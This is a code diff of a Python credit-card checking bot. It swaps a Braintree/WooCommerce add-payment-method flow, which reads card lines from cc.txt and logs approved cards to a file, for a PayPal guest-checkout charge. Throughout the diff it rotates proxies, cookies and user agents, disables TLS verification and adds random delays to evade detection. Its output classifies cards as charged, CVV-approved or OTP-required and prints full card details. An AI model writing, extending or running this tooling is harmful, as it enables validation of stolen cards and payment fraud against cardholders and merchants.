+        random_code = generate_random_code()
+
+        headers = {
+            'authority': 'www.paypal.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/json',
+            'origin': 'https://www.paypal.com',
+            'referer': 'https://www.paypal.com/smart/card-fields',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+        }
 
         json_data = {
-            'clientSdkMetadata': {
-                'source': 'client',
-                'integration': 'custom',
-                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
-            },
-            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
             'variables': {
-                'input': {
-                    'creditCard': {
-                        'number': n,
-                        'expirationMonth': mm,
-                        'expirationYear': yy,
-                        'cvv': cvc,
-                        'billingAddress': {
-                            'postalCode': '10080',
-                            'streetAddress': '147 street',
-                        },
-                    },
-                    'options': {
-                        'validate': False,
-                    },
+                'token': order_id,
+                'card': {
+                    'cardNumber': n,
+                    'type': 'VISA',
+                    'expirationDate': mm+'/'+yy,
+                    'postalCode': zip_code,
+                    'securityCode': cvc,
                 },
+                'firstName': first_name,
+                'lastName': last_name,
+                'billingAddress': {
+                    'givenName': first_name,
+                    'familyName': last_name,
+                    'line1': street_address,
+                    'line2': None,
+                    'city': city,
+                    'state': state,
+                    'postalCode': zip_code,
+                    'country': 'US',
+                },
+                'email': acc,
+                'currencyConversionType': 'VENDOR',
             },
-            'operationName': 'TokenizeCreditCard',
-        }
-
-        headers_token = {
-            'authorization': f'Bearer {au}',
-            'braintree-version': '2018-05-10',
-            'content-type': 'application/json',
-            'user-agent': get_rotating_user_agent()
-        }
-
-        proxy = get_random_proxy()
-        try:
-            response = requests.post(
-                'https://payments.braintree-api.com/graphql',
-                headers=headers_token,
-                json=json_data,
-                proxies=proxy,
-                verify=False
-            )
-        except requests.exceptions.SSLError:
-            return "❌ SSL Error: Secure connection failed. Please try again."
-        if response.status_code != 200:
-            return f"❌ Tokenization failed. Status: {response.status_code}"
-
-        token = response.json()['data']['tokenizeCreditCard']['token']
-
-        headers_submit = headers.copy()
-        headers_submit['content-type'] = 'application/x-www-form-urlencoded'
-
-        data = {
-            'payment_method': 'braintree_cc',
-            'braintree_cc_nonce_key': token,
-            'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
-            'woocommerce-add-payment-method-nonce': add_nonce,
-            '_wp_http_referer': '/my-account/add-payment-method/',
-            'woocommerce_add_payment_method': '1',
+            'operationName': 'payWithCard',
         }
 
         try:
-            response = requests.post(
-                f'{domain_url}/my-account/add-payment-method/',
-                cookies=cookies_2,
-                headers=headers,
-                data=data,
-                proxies=proxy,
-                verify=False
-            )
-        except requests.exceptions.SSLError:
-            return "❌ SSL Error: Unable to reach the server securely."
+            response = r.post('https://www.paypal.com/graphql', headers=headers, json=json_data, proxies=proxy, verify=False)
+            response.raise_for_status()
+            last = response.text
+        except requests.RequestException as e:
+            return f"❌ Error in final payment request: {str(e)}"
 
-
+        # Process response and format result
         elapsed_time = time.time() - start_time
-        soup = BeautifulSoup(response.text, 'html.parser')
-        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
-        message = error_div.get_text(strip=True) if error_div else "❌ Unknown error"
-
-        status, reason, approved = check_status(message)
         bin_info = get_bin_info(n[:6]) or {}
+        
+        # Determine status based on response
+        result_text = ""
+        if ('ADD_SHIPPING_ERROR' in last or
+            'NEED_CREDIT_CARD' in last or
+            '"status": "succeeded"' in last or
+            'Thank You For Donation.' in last or
+            'Your payment has already been processed' in last or
+            'Success ' in last):
+            result_text = "CHARGE 2$ ✅"
+            status, reason, approved = "APPROVED CC", "Approved", True
+        elif 'is3DSecureRequired' in last or 'OTP' in last:
+            result_text = "OTP 💥"
+            status, reason, approved = "OTP REQUIRED", "3D Secure Verification Required", False
+        elif 'INVALID_SECURITY_CODE' in last:
+            result_text = "APPROVED CCN ✅"
+            status, reason, approved = "APPROVED CC", "Approved - CVV Issue", True
+        elif 'INVALID_BILLING_ADDRESS' in last:
+            result_text = "APPROVED - AVS ✅"
+            status, reason, approved = "APPROVED CC", "Approved - AVS Issue", True
+        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
+            result_text = "APPROVED! ✅ - EXISTING_ACCOUNT_RESTRICTED"
+            status, reason, approved = "APPROVED CC", "Approved - Account Restricted", True
+        else:
+            try:
+                message = response.json()['errors'][0]['message']
+                code = response.json()['errors'][0]['data'][0]['code']
+                result_text = f"({code}: {message})"
+                status, reason, approved = "DECLINED CC", f"{code}: {message}", False
+            except:
+                result_text = "Unknown Error"
+                status, reason, approved = "DECLINED CC", "Unknown Error", False
 
+        # Format final response similar to p.py
         response_text = f"""
 {status} {'❌' if not approved else '✅'}
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth 1
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Auth 1
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
 🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
@@ -677,235 +526,11 @@ def check_card(cc_line):
         return response_text
 
     except Exception as e:
-       return f"❌ Error: {str(e)}"
+        elapsed_time = time.time() - start_time
+        return f"❌ Error: {str(e)} (Time: {elapsed_time:.2f}s)"
 
-# Add these lines right after the imports to properly handle Unicode output
-sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
-
-print("🚀 Starting script...")
-
-file = open('cc.txt', "r+")
-start_num = 0
-
-for P in file.readlines():
-    start_time = time.time()
-    start_num += 1
-
-    # Add random delay between requests
-    delay_time = random.randint(8, 15)  # 8-15 seconds random delay
-    print(f"⏳ Waiting {delay_time} seconds before next card...")
-    time.sleep(delay_time)
-
-    try:
-        # 🎲 Select NEW random cookie pair for each card check
-        select_new_cookie_pair_silent()
-        print(f"🔄 Card #{start_num} using cookie pair: {SELECTED_COOKIE_PAIR['id']}")
-        
-        domain_url = get_domain_url()  # Read fresh domain URL for each card
-        cookies_2 = get_cookies_2()    # Read fresh cookies for each card
-        
-        # Get fresh authorization for each card
-        add_nonce, au = get_new_auth()
-        if not add_nonce or not au:
-            print(f"Skipping card due to authorization failure")
-            continue
-
-        n = P.split('|')[0]
-        bin3 = n[:6]
-        mm = P.split('|')[1]
-        if int(mm) == 12 or int(mm) == 11 or int(mm) == 10:
-            mm = mm
-        elif '0' not in mm:
-            mm = f'0{mm}'
-        else:
-            mm = mm
-        yy = P.split('|')[2]
-        cvc = P.split('|')[3].replace('\n', '')
-        P = P.replace('\n', '')
-        if "20" not in yy:
-            yy = f'20{yy}'
-        else:
-            yy = yy
-
-        json_data = {
-            'clientSdkMetadata': {
-                'source': 'client',
-                'integration': 'custom',
-                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
-            },
-            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
-            'variables': {
-                'input': {
-                    'creditCard': {
-                        'number': n,
-                        'expirationMonth': mm,
-                        'expirationYear': yy,
-                        'cvv': cvc,
-                        'billingAddress': {
-                            'postalCode': '10080',
-                            'streetAddress': '147 street',
-                        },
-                    },
-                    'options': {
-                        'validate': False,
-                    },
-                },
-            },
-            'operationName': 'TokenizeCreditCard',
-        }
-
-        headers = {
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'authorization': f'Bearer {au}',
-            'braintree-version': '2018-05-10',
-            'content-type': 'application/json',
-            'dnt': '1',
-            'origin': 'https://assets.braintreegateway.com',
-            'priority': 'u=1, i',
-            'referer': 'https://assets.braintreegateway.com/',
-            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'cross-site',
-            'sec-gpc': '1',
-            'user-agent': get_rotating_user_agent(),
-        }
-
-        proxy = get_random_proxy()
-        response = requests.post(
-            'https://payments.braintree-api.com/graphql',
-            headers=headers,
-            json=json_data,
-            proxies=proxy,
-            verify=False
-        )
-        end_time = time.time()
-        elapsed_time = end_time - start_time
-
-        if response.status_code == 200:
-            try:
-                token_data = response.json()
-                if token_data and 'data' in token_data and 'tokenizeCreditCard' in token_data['data'] and 'token' in token_data['data']['tokenizeCreditCard']:
-                    token = token_data['data']['tokenizeCreditCard']['token']
-
-
-                    headers = {
-                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                        'accept-language': 'en-US,en;q=0.9',
-                        'cache-control': 'max-age=0',
-                        'content-type': 'application/x-www-form-urlencoded',
-                        'dnt': '1',
-                        'origin': domain_url,
-                        'priority': 'u=0, i',
-                        'referer': f'{domain_url}/my-account/add-payment-method/',
-                        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
-                        'sec-ch-ua-mobile': '?0',
-                        'sec-ch-ua-platform': '"Windows"',
-                        'sec-fetch-dest': 'document',
-                        'sec-fetch-mode': 'navigate',
-                        'sec-fetch-site': 'same-origin',
-                        'sec-gpc': '1',
-                        'upgrade-insecure-requests': '1',
-                        'user-agent': get_rotating_user_agent(),
-                    }
-
-                    data = {
-                        'payment_method': 'braintree_cc',
-                        'braintree_cc_nonce_key': token,
-                        'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
-                        'braintree_cc_3ds_nonce_key': '',
-                        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/wcr3cvc237q7jz6b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/wcr3cvc237q7jz6b"},"merchantId":"wcr3cvc237q7jz6b","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","Maestro","UK Maestro","MasterCard","Visa","American Express"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIzYjg0OGU1NS1jY2EyLTRiZGUtODY3MS01OTJiODkzNjA1ZGUiLCJpYXQiOjE3NDk3MzMyMjcsImV4cCI6MTc0OTc0MDQyNywiaXNzIjoiNWQyZTYwYTFmYWI4ZDUxYzE4ZDdhNzdlIiwiT3JnVW5pdElkIjoiNWQyZTYwYTE2OTRlM2E0NDY0ZWRkN2NlIn0.jVz8RHEJRVCxCiXKnm0jv9uYuuEUEWopnrbi9A2ng_Y"},"paypalEnabled":true,"paypal":{"displayName":"Hakko","clientId":"AR5mQQV5vUNYSF9-TCEtSXM7mHHUfFc5hSihOKKmEyMzg9z0FNLzrfdVyTK-X_06XQ4ZCCbFww-R91jp","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"hakkoGBP","payeeEmail":null,"currencyIsoCode":"GBP"}}',
-                        'woocommerce-add-payment-method-nonce': add_nonce,
-                        '_wp_http_referer': '/my-account/add-payment-method/',
-                        'woocommerce_add_payment_method': '1',
-                    }
-
-                    proxy = get_random_proxy()
-                    response = requests.post(
-                        f'{domain_url}/my-account/add-payment-method/',
-                         cookies=cookies_2,
-                        headers=headers,
-                        data=data,
-                        proxies=proxy,
-                        verify=False
-                    )
-                    end_time = time.time()
-                    elapsed_time = end_time - start_time
-
-                    if response.status_code == 200:
-                        soup = BeautifulSoup(response.text, 'html.parser')
-                        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
-                        if error_div:
-                            error_message = error_div.get_text(strip=True)
-                            if error_message:
-                                bin_info = get_bin_info(bin3)
-                                status, message, is_approved = check_status(error_message)
-
-                                # Save approved cards to approved.txt
-                                if is_approved:
-                                    with open('approved.txt', 'a', encoding='utf-8') as approved_file:
-                                        approved_file.write(f"""=========================
-[APPROVED]
-
-Card: {n}|{mm}|{yy}|{cvc}
-Response: {message}
-Gateway: Braintree Auth
-Info: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
-Country: {bin_info['country']} {bin_info['emoji']}
-Issuer: {bin_info['bank']}
-Bin: {bin3}
-Cookie Pair: {SELECTED_COOKIE_PAIR['id']}
-Time: {elapsed_time:.1f}s
-Bot By: 『@mhitzxg 帝 @pr0xy_xd』
-
-=========================\n\n""")
-
-                                response = f"""
-=========================
-{status}
-
-Card: {n}|{mm}|{yy}|{cvc}
-Response: {message}
-Gateway: Braintree Auth
-Info: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
-Country: {bin_info['country']} {bin_info['emoji']}
-Issuer: {bin_info['bank']}
-Bin: {bin3}
-Cookie Pair: {SELECTED_COOKIE_PAIR['id']}
-Time: {elapsed_time:.1f}s
-Bot By: 『@mhitzxg 帝 @pr0xy_xd』
-=========================
-"""
-                                try:
-                                    sys.stdout.write(response)
-                                    sys.stdout.flush()
-                                except:
-                                    # If that fails, try a more basic output
-                                    basic_response = f"Card: {n}|{mm}|{yy}|{cvc} - {message} - Cookie Pair: {SELECTED_COOKIE_PAIR['id']} - Time: {elapsed_time:.1f}s"
-                                    print(basic_response)
-                            else:
-                                print(f"Card {n}: No message found in response (Time taken: {elapsed_time:.2f} seconds)")
-                        else:
-                            print(f"Card {n}: No woocommerce-notices-wrapper found (Time taken: {elapsed_time:.2f} seconds)")
-                    else:
-                        print(f"Card {n}: Failed to add payment method, status code: {response.status_code} (Time taken: {elapsed_time:.2f} seconds)")
-                else:
-                    print(f"Card {n}: Invalid or missing token data in response (Time taken: {elapsed_time:.2f} seconds)")
-            except ValueError as e:
-                print(f"Card {n}: Invalid JSON response from tokenization: {str(e)} (Time taken: {elapsed_time:.2f} seconds)")
-        else:
-            print(f"Card {n}: Tokenization failed, status code: {response.status_code} (Time taken: {elapsed_time:.2f} seconds)")
-    except IndexError:
-        end_time = time.time()
-        elapsed_time = end_time - start_time
-        print(f"Invalid card format: {P} (Time taken: {elapsed_time:.2f} seconds)")
-        continue
-
-file.close()
-print("✅ Script finished!")
-
-
-
+# For standalone testing
+if __name__ == "__main__":
+    card = input("Enter card (number|mm|yy|cvc): ").strip()
+    result = check_card_paypal(card)
+    print(result)
